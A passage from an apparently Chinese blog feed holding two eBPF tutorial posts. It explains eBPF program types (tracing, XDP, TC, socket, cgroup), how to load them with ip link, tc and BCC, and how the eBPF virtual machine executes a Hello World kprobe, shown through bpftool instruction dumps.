BPF_PROG_TYPE_CGROUP_SYSCTL,</span><br><span class="line">  BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SOCKOPT,</span><br><span class="line">  BPF_PROG_TYPE_TRACING,</span><br><span class="line">  BPF_PROG_TYPE_STRUCT_OPS,</span><br><span class="line">  BPF_PROG_TYPE_EXT,</span><br><span class="line">  BPF_PROG_TYPE_LSM,</span><br><span class="line">  BPF_PROG_TYPE_SK_LOOKUP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于具体的内核来说，因为不同内核的版本和编译配置选项不同，一个内核并不会支持所有的程序类型。你可以在命令行中执行下面的命令，来查询当前系统支持的程序类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpftool feature probe | grep program_type</span><br></pre></td></tr></table></figure><p>执行后，你会得到如下的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">eBPF program_type socket_filter is available</span><br><span class="line">eBPF program_type kprobe is available</span><br><span class="line">eBPF program_type sched_cls is available</span><br><span class="line">eBPF program_type sched_act is available</span><br><span class="line">eBPF program_type tracepoint is available</span><br><span class="line">eBPF program_type xdp is available</span><br><span class="line">eBPF program_type perf_event is available</span><br><span class="line">eBPF program_type cgroup_skb is available</span><br><span class="line">eBPF program_type cgroup_sock is available</span><br><span class="line">eBPF program_type lwt_in is available</span><br><span class="line">eBPF program_type lwt_out is available</span><br><span class="line">eBPF program_type lwt_xmit is available</span><br><span class="line">eBPF program_type sock_ops is available</span><br><span class="line">eBPF program_type sk_skb is available</span><br><span class="line">eBPF program_type cgroup_device is available</span><br><span class="line">eBPF program_type sk_msg is available</span><br><span class="line">eBPF program_type raw_tracepoint is available</span><br><span class="line">eBPF program_type cgroup_sock_addr is available</span><br><span class="line">eBPF program_type lwt_seg6local is available</span><br><span class="line">eBPF program_type lirc_mode2 is NOT available</span><br><span class="line">eBPF program_type sk_reuseport is available</span><br><span class="line">eBPF program_type flow_dissector is available</span><br><span class="line">eBPF program_type cgroup_sysctl is available</span><br><span class="line">eBPF program_type raw_tracepoint_writable is available</span><br><span class="line">eBPF program_type cgroup_sockopt is available</span><br><span class="line">eBPF program_type tracing is NOT available</span><br><span class="line">eBPF program_type struct_ops is available</span><br><span class="line">eBPF program_type ext is NOT available</span><br><span class="line">eBPF program_type lsm is NOT available</span><br><span class="line">eBPF program_type sk_lookup is available</span><br></pre></td></tr></table></figure><p>在这些输出中，你可以看到当前内核支持 kprobe、xdp、perf_event 等程序类型，而不支持 ext、lsm 等程序类型。</p><p>根据具体功能和应用场景的不同，这些程序类型大致可以划分为三类：</p><ul><li>第一类是跟踪，即从内核和程序的运行状态中提取跟踪信息，来了解当前系统正在发生什么。</li><li>第二类是网络，即对网络数据包进行过滤和处理，以便了解和控制网络数据包的收发过程。</li><li>第三类是除跟踪和网络之外的其他类型，包括安全控制、BPF 扩展等等。</li></ul><p>接下来，我就带你一起分别看看，每一类 eBPF 程序都有哪些具体的类型，以及这些不同类型的程序都是由哪些事件触发执行的。</p><h2 id="跟踪类-eBPF-程序"><a href="#跟踪类-eBPF-程序" class="headerlink" title="跟踪类 eBPF 程序"></a>跟踪类 eBPF 程序</h2><p>先看第一类，也就是跟踪类 eBPF 程序。</p><p><strong>跟踪类 eBPF 程序主要用于从系统中提取跟踪信息，进而为监控、排错、性能优化等提供数据支撑</strong>。比如，我们前几讲中的 Hello World 示例就是一个 <code>BPF_PROG_TYPE_KPROBE</code> 类型的跟踪程序，它的目的是跟踪内核函数是否被某个进程调用了。</p><p>为了方便你查询，我把常见的跟踪类 BPF 程序的主要功能以及使用限制整理成了一个表格，你可以在需要时参考。</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/traceClass.png" class><p>这其中，KPROBE、TRACEPOINT 以及 PERF_EVENT 都是最常用的 eBPF 程序类型，大量应用于监控跟踪、性能优化以及调试排错等场景中。我们前几讲中提到的 <a class="link" href="https://github.com/iovisor/bcc">BCC<i class="fas fa-external-link-alt"></i></a>工具集，其中包含的绝大部分工具也都属于这个类型。</p><h2 id="网络类-eBPF-程序"><a href="#网络类-eBPF-程序" class="headerlink" title="网络类 eBPF 程序"></a>网络类 eBPF 程序</h2><p>看完跟踪类 eBPF 程序，我们再来看看网络类 eBPF 程序。</p><p><strong>网络类 eBPF 程序主要用于对网络数据包进行过滤和处理，进而实现网络的观测、过滤、流量控制以及性能优化等各种丰富的功能</strong>。根据事件触发位置的不同，网络类 eBPF 程序又可以分为 XDP（eXpress Data Path，高速数据路径）程序、TC（Traffic Control，流量控制）程序、套接字程序以及 cgroup 程序，下面我们来分别看看。</p><h2 id="XDP-程序"><a href="#XDP-程序" class="headerlink" title="XDP 程序"></a>XDP 程序</h2><p>XDP 程序的类型定义为 <code>BPF_PROG_TYPE_XDP</code>，它在<strong>网络驱动程序刚刚收到数据包时</strong>触发执行。由于无需通过繁杂的内核网络协议栈，XDP 程序可用来实现高性能的网络处理方案，常用于 DDoS 防御、防火墙、4 层负载均衡等场景。</p><p>你需要注意，XDP 程序并不是绕过了内核协议栈，它只是在内核协议栈之前处理数据包，而处理过的数据包还可以正常通过内核协议栈继续处理。你可以通过下面的图片（图片来自 iovisor.org）加深对  XDP 相对内核协议栈位置的理解：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/XDP.png" class><p>根据网卡和网卡驱动是否原生支持 XDP 程序，XDP 运行模式可以分为下面这三种：</p><ul><li>通用模式。它不需要网卡和网卡驱动的支持，XDP 程序像常规的网络协议栈一样运行在内核中，性能相对较差，一般用于测试；</li><li>原生模式。它需要网卡驱动程序的支持，XDP 程序在网卡驱动程序的早期路径运行；</li><li>卸载模式。它需要网卡固件支持 XDP 卸载，XDP 程序直接运行在网卡上，而不再需要消耗主机的 CPU 资源，具有最好的性能。</li></ul><p>无论哪种模式，XDP 程序在处理过网络包之后，都需要根据 eBPF 程序执行结果，决定数据包的去处。这些执行结果对应以下 5 种 XDP 程序结果码：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/FiveResultCodeXDP.png" class><p>通常来说，XDP 程序通过 <code>ip link</code> 命令加载到具体的网卡上，加载格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth1 为网卡名</span></span><br><span class="line"><span class="comment"># xdpgeneric 设置运行模式为通用模式</span></span><br><span class="line"><span class="comment"># xdp-example.o 为编译后的 XDP 字节码</span></span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> dev eth1 xdpgeneric object xdp-example.o</span><br></pre></td></tr></table></figure><p>而卸载 XDP 程序也是通过 <code>ip link</code> 命令，具体参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> veth1 xdpgeneric off</span><br></pre></td></tr></table></figure><p>除了 <code>ip link</code> 之外， BCC 也提供了方便的库函数，让我们可以在同一个程序中管理 XDP 程序的生命周期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译XDP程序</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;xdp-example.c&quot;</span>)</span><br><span class="line">fn = b.load_func(<span class="string">&quot;xdp-example&quot;</span>, BPF.XDP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载XDP程序到eth0网卡</span></span><br><span class="line">device = <span class="string">&quot;eth0&quot;</span></span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他处理逻辑</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载XDP程序</span></span><br><span class="line">b.remove_xdp(device)</span><br></pre></td></tr></table></figure><h2 id="TC-程序"><a href="#TC-程序" class="headerlink" title="TC 程序"></a>TC 程序</h2><p>TC 程序的类型定义为 <code>BPF_PROG_TYPE_SCHED_CLS</code> 和 <code>BPF_PROG_TYPE_SCHED_ACT</code>，分别作为 <a class="link" href="https://tldp.org/HOWTO/Traffic-Control-HOWTO/index.html">Linux 流量控制<i class="fas fa-external-link-alt"></i></a> 的分类器和执行器。Linux 流量控制通过网卡队列、排队规则、分类器、过滤器以及执行器等，实现了对网络流量的整形调度和带宽控制。</p><p>下图（图片来自 linux-ip.net）展示了  HTB（Hierarchical Token Bucket，层级令牌桶）流量控制的工作原理：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/HTBucketOri.png" class><p>得益于内核 v4.4 引入的 <a class="link" href="https://docs.cilium.io/en/v1.8/bpf/#tc-traffic-control">direct-action<i class="fas fa-external-link-alt"></i></a> 模式，TC 程序可以直接在一个程序内完成分类和执行的动作，而无需再调用其他的 TC 排队规则和分类器，具体如下图所示：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/TCProgram.png" class><p>同 XDP 程序相比，TC 程序可以<strong>直接获取内核解析后的网络报文数据结构</strong> <code>sk_buff</code>（XDP 则是 <code>xdp_buff</code>），并且可在网卡的接收和发送两个方向上执行（XDP 则只能用于接收）。下面我们来具体看看  TC 程序的执行位置：</p><ul><li>对于接收的网络包，TC 程序在网卡接收（GRO）之后、协议栈处理（包括 IP 层处理和 iptables 等）之前执行；</li><li>对于发送的网络包，TC 程序在协议栈处理（包括 IP 层处理和 iptables 等）之后、数据包发送到网卡队列（GSO）之前执行。</li></ul><p>除此之外，由于 TC 运行在内核协议栈中，不需要网卡驱动程序做任何改动，因而可以挂载到任意类型的网卡设备（包括容器等使用的虚拟网卡）上。</p><p>同 XDP 程序一样，TC eBPF 程序也可以通过 Linux 命令行工具来加载到网卡上，不过相应的工具要换成 tc。你可以通过下面的命令，分别加载接收和发送方向的 eBPF 程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 clsact 类型的排队规则</span></span><br><span class="line">sudo tc qdisc add dev eth0 clsact</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载接收方向的 eBPF 程序</span></span><br><span class="line">sudo tc filter add dev eth0 ingress bpf da obj tc-example.o sec ingress</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载发送方向的 eBPF 程序</span></span><br><span class="line">sudo tc filter add dev eth0 egress bpf da obj tc-example.o sec egress</span><br></pre></td></tr></table></figure><h2 id="套接字程序"><a href="#套接字程序" class="headerlink" title="套接字程序"></a>套接字程序</h2><p>套接字程序用于过滤、观测或重定向套接字网络包，具体的种类也比较丰富。根据类型的不同，套接字 eBPF 程序可以挂载到套接字（socket）、控制组（cgroup ）以及网络命名空间（netns）等各个位置。你可以根据具体的应用场景，选择一个或组合多个类型的 eBPF 程序，去控制套接字的网络包收发过程。</p><p>这里，我把常见的套接字程序类型，以及它们的应用场景和挂载方法整理成了一个表格，你可以在需要时参考：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/socket.png" class><h2 id="cgroup-程序"><a href="#cgroup-程序" class="headerlink" title="cgroup 程序"></a>cgroup 程序</h2><p>cgroup 程序用于<strong>对 cgroup 内所有进程的网络过滤、套接字选项以及转发等进行动态控制</strong>，它最典型的应用场景是对容器中运行的多个进程进行网络控制。</p><p>cgroup 程序的种类比较丰富，我也帮你整理了一个表格，方便你在需要时查询：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/cgroup.png" class><p>这些类型的 BPF 程序都可以通过 BPF 系统调用的 <code>BPF_PROG_ATTACH</code> 命令来进行挂载，并设置挂载类型为匹配的 <code>BPF_CGROUP_xxx</code> 类型。比如，在挂载 <code>BPF_PROG_TYPE_CGROUP_DEVICE</code> 类型的 BPF 程序时，需要设置 <code>bpf_attach_type</code> 为 <code>BPF_CGROUP_DEVICE</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">attr.target_fd = target_fd;            <span class="comment">// cgroup文件描述符</span></span><br><span class="line">attr.attach_bpf_fd = prog_fd;          <span class="comment">// BPF程序文件描述符</span></span><br><span class="line">attr.attach_type = BPF_CGROUP_DEVICE;  <span class="comment">// 挂载类型为BPF_CGROUP_DEVICE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf(BPF_PROG_ATTACH, &amp;attr, <span class="keyword">sizeof</span>(attr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> -errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>注意，这几类网络 eBPF 程序是在不同的事件触发时执行的，因此，在实际应用中我们通常可以把多个类型的 eBPF 程序结合起来，一起使用，来实现复杂的网络控制功能。比如，最流行的 Kubernetes 网络方案 Cilium 就大量使用了 XDP、TC 和套接字 eBPF 程序，如下图（图片来自 Cilium 官方文档，图中黄色部分即为 Cilium eBPF 程序）所示：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/CiliumeBPF.png" class><h2 id="其他类-eBPF-程序"><a href="#其他类-eBPF-程序" class="headerlink" title="其他类 eBPF 程序"></a>其他类 eBPF 程序</h2><p>除了上面的跟踪和网络 eBPF 程序之外，Linux 内核还支持很多其他的类型。这些类型的 eBPF 程序虽然不太常用，但在需要的时候也可以帮你解决很多特定的问题。</p><p>我将这些无法划分到网络和跟踪的 eBPF 程序都归为其他类，并帮你整理了一个表格：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/OthereBPF.png" class><p>这个表格列出了一些不太常用的 eBPF 程序类型，可以先大致浏览下，在需要的时候再去深入了解。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>根据具体功能和应用场景的不同，我们可以把 eBPF 程序分为跟踪、网络和其他三类：</p><ul><li>跟踪类 eBPF 程序主要用于从系统中提取跟踪信息，进而为监控、排错、性能优化等提供数据支撑；</li><li>网络类 eBPF 程序主要用于对网络数据包进行过滤和处理，进而实现网络的观测、过滤、流量控制以及性能优化等；</li><li>其他类则包含了跟踪和网络之外的其他  eBPF  程序类型，如安全控制、BPF 扩展等。</li></ul><p>虽然每个 eBPF 程序都有特定的类型和触发事件，但这并不意味着它们都是完全独立的。通过 BPF 映射提供的状态共享机制，各种不同类型的 eBPF 程序完全可以相互配合，不仅可以绕过单个 eBPF 程序指令数量<br>的限制，还可以实现更为复杂的控制逻辑。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术和实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;各类 eBPF 程序的触发机制及其应用场景，eBPF 学习（三）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 运行原理</title>
    <link href="https://drun1baby.github.io/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/"/>
    <id>https://drun1baby.github.io/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/</id>
    <published>2023-08-03T14:48:30.000Z</published>
    <updated>2023-08-06T06:03:01.838Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 运行原理，eBPF 学习（二）</p><span id="more"></span><h1 id="eBPF-运行原理篇"><a href="#eBPF-运行原理篇" class="headerlink" title="eBPF 运行原理篇"></a>eBPF 运行原理篇</h1><h2 id="eBPF-虚拟机是如何工作的"><a href="#eBPF-虚拟机是如何工作的" class="headerlink" title="eBPF 虚拟机是如何工作的"></a>eBPF 虚拟机是如何工作的</h2><h3 id="eBPF-的五个模块"><a href="#eBPF-的五个模块" class="headerlink" title="eBPF 的五个模块"></a>eBPF 的五个模块</h3><p>eBPF 是一个运行在内核中的虚拟机，很多人在初次接触它时，会把它跟系统虚拟化（比如 kvm）中的虚拟机弄混。其实，虽然都被称为“虚拟机”，系统虚拟化和 eBPF 虚拟机还是有着本质不同的。</p><p>系统虚拟化基于 x86 或 arm64 等通用指令集，这些指令集足以完成完整计算机的所有功能。而为了确保在内核中安全地执行，eBPF 只提供了非常有限的指令集。这些指令集可用于完成一部分内核的功能，但却远不足以模拟完整的计算机。为了更高效地与内核进行交互，eBPF 指令还有意采用了 C 调用约定，其提供的辅助函数可以在 C 语言中直接调用，极大地方便了 eBPF 程序的开发。</p><p>如下图（图片来自 BPF Internals）所示，eBPF 在内核中的运行时主要由 5 个模块组成：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/RunningeBPF.png" class><ul><li>第一个模块是  <strong>eBPF 辅助函数</strong>。它提供了一系列用于 eBPF 程序与内核其他模块进行交互的函数。这些函数并不是任意一个 eBPF 程序都可以调用的，具体可用的函数集由 BPF 程序类型决定。</li><li>第二个模块是  <strong>eBPF 验证器</strong>。它用于确保 eBPF 程序的安全。验证器会将待执行的指令创建为一个有向无环图（DAG），确保程序中不包含不可达指令；接着再模拟指令的执行过程，确保不会执行无效指令。</li><li>第三个模块是由  <strong>11 个 64 位寄存器、一个程序计数器和一个 512 字节的栈组成的存储模块</strong>。这个模块用于控制 eBPF 程序的执行。其中，R0 寄存器用于存储函数调用和 eBPF 程序的返回值，这意味着函数调用最多只能有一个返回值；R1-R5 寄存器用于函数调用的参数，因此函数调用的参数最多不能超过 5 个；而 R10 则是一个只读寄存器，用于从栈中读取数据。</li><li>第四个模块是即时编译器，它将 eBPF 字节码编译成本地机器指令，以便更高效地在内核中执行。</li><li>第五个模块是  BPF 映射（map），它用于提供大块的存储。这些存储可被用户空间程序用来进行访问，进而控制 eBPF 程序的运行状态。</li></ul><p>关于 BPF 辅助函数和 BPF 映射的具体内容我会放在后续的文章里面详细编写，现在我们先来看看 BPF 指令的具体格式，以及它是如何加载到内核中，又是何时运行的。</p><h3 id="BPF-指令是什么样的"><a href="#BPF-指令是什么样的" class="headerlink" title="BPF 指令是什么样的"></a>BPF 指令是什么样的</h3><p>用上一讲的 Hello World 作为例子，一起看下 BPF 指令到底是什么样子的。</p><p>它的逻辑其实很简单，先调用    bpf_trace_printk  输出一个 “Hello, World!” 字符串，然后就返回成功了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  bpf_trace_printk(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们通过 BCC 的 Python 库，加载并运行了这个 eBPF 程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># This is a Hello World example of BPF.</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"><span class="comment"># load BPF program</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;hello.c&quot;</span>)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="string">&quot;hello_world&quot;</span>)</span><br><span class="line">b.trace_print()</span><br></pre></td></tr></table></figure><p>在终端中运行下面的命令，就可以启动这个 eBPF 程序（注意， BCC 帮你完成了编译和加载的过程）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 hello.py</span><br></pre></td></tr></table></figure><p>接下来我们使用一个新的工具 bpftool，用它可以查看 eBPF 程序的运行状态。</p><p>首先，打开一个新的终端，执行下面的命令，查询系统中正在运行的 eBPF 程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool prog list</span><br><span class="line"></span><br><span class="line">579: kprobe  name hello_world  tag 38dd440716c4900f  gpl</span><br><span class="line">        loaded_at 2023-08-06T09:01:22+0800  uid 0</span><br><span class="line">        xlated 104B  jited 70B  memlock 4096B</span><br><span class="line">        btf_id 8</span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/bpftoolList.png" class><p>输出中，579 是这个 eBPF 程序的编号，kprobe 是程序的类型，而 hello_world 是程序的名字。</p><p>有了 eBPF 程序编号之后，执行下面的命令就可以导出这个 eBPF 程序的指令（注意把 579 替换成你查询到的编号）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool prog dump xlated <span class="built_in">id</span> 579</span><br></pre></td></tr></table></figure><p>这里有个小坑，需要自己手动编译 libelf-dev 的源码，具体见 <a class="link" href="https://blog.csdn.net/Withdraw_end/article/details/132127777">https://blog.csdn.net/Withdraw_end/article/details/132127777<i class="fas fa-external-link-alt"></i></a> </p><p>输出结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> * ctx)</span>:</span><br><span class="line">; <span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">   0: <span class="params">(b7)</span> r1 = <span class="number">33</span></span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">   <span class="number">1</span>: (<span class="number">6b</span>) *(u16 *)(r10 <span class="number">-4</span>) = r1</span><br><span class="line">   <span class="number">2</span>: (b7) r1 = <span class="number">1684828783</span></span><br><span class="line">   <span class="number">3</span>: (<span class="number">63</span>) *(u32 *)(r10 <span class="number">-8</span>) = r1</span><br><span class="line">   <span class="number">4</span>: (<span class="number">18</span>) r1 = <span class="number">0x57202c6f6c6c6548</span></span><br><span class="line">   <span class="number">6</span>: (<span class="number">7b</span>) *(u64 *)(r10 <span class="number">-16</span>) = r1</span><br><span class="line">   <span class="number">7</span>: (bf) r1 = r10</span><br><span class="line">; </span><br><span class="line">   <span class="number">8</span>: (<span class="number">07</span>) r1 += <span class="number">-16</span></span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">   <span class="number">9</span>: (b7) r2 = <span class="number">14</span></span><br><span class="line">  <span class="number">10</span>: (<span class="number">85</span>) call bpf_trace_printk#<span class="number">-58800</span></span><br><span class="line">; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="number">11</span>: (b7) r0 = <span class="number">0</span></span><br><span class="line">  <span class="number">12</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/outputOrder580.png" class><p>其中，分号开头的部分，正是我们前面写的 C 代码，而其他行则是具体的 BPF 指令。具体每一行的 BPF 指令又分为三部分：</p><ul><li>第一部分，冒号前面的数字 0-12 ，代表 BPF 指令行数；</li><li>第二部分，括号中的 16 进制数值，表示 BPF 指令码。它的具体含义你可以参考 IOVisor BPF 文档，比如第 0 行的 0xb7 表示为 64 位寄存器赋值。</li><li>第三部分，括号后面的部分，就是 BPF 指令的伪代码。</li></ul><p>结合前面讲述的各个寄存器的作用，不难理解这些 BPF 指令的含义：</p><ul><li>第 0-8 行，借助 R10 寄存器从栈中把字符串 “Hello, World!” 读出来，并放入 R1 寄存器中；</li><li>第 9 行，向 R2 寄存器写入字符串的长度 14（即代码注释里面的  <code>sizeof(_fmt)</code> ）；</li><li>第 10 行，调用 BPF 辅助函数  <code>bpf_trace_printk</code>  输出字符串；</li><li>第 11 行，向 R0 寄存器写入 0，表示程序的返回值是 0；</li><li>最后一行，程序执行成功退出。</li></ul><p>总结起来，<strong>这些指令先通过 R1 和 R2 寄存器设置了 <code>bpf_trace_printk</code> 的参数，然后调用 <code>bpf_trace_printk</code> 函数输出字符串，最后再通过 R0 寄存器返回成功</strong>。</p><p>实际上我们也可以通过类似的 BPF 指令来开发 eBPF 程序，不过相对于一开始的 C 程序相比，BPF 指令的可读性和维护性明显差得多。所以还是建议使用 C 语言开发 eBPF 程序，而只把 BPF 指令作为排查 eBPF 程序疑难杂症时的参考。</p><p>这里，来简单看看  BPF 指令加载后是如何运行的。当这些 BPF 指令加载到内核后， BPF 即时编译器会将其编译成本地机器指令，最后才会执行编译后的机器指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 